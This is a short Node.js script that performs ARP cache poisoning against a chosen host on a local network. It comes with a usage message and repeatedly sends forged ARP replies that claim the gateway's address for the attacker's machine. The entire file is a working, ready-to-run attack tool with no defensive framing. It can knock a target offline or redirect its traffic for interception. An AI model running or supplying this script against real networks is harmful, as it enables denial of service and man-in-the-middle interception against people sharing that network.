const arp = require('arpjs');


if (process.argv.length < 6) {
  console.error('interface targetip gatewayip intervalms');
  console.error('example');
  console.error('node block.js wlan0 192.168.178.61 192.168.178.1 8000');
  process.exit(1);
}

const interface  = process.argv[2];
const targetip   = process.argv[3];
const gatewayip  = process.argv[4]; // should be OUR/workstation IP 
                                    // tell target gateway is me
const intervalms = process.argv[5];

console.log(process.argv)

arp.setInterface(interface);

function block(targetip, gatewayip){
  process.stdout.write('.')
  arp.poison(targetip, gatewayip);
  // Tells targetip that I am gatewayip, a.k.a. Sends a gratuitous ARP Reply to targetip telling that the MAC Address of gatewayip is its own MAC.
}

h = setInterval(()=>{
  block(targetip, gatewayip)
}, intervalms);

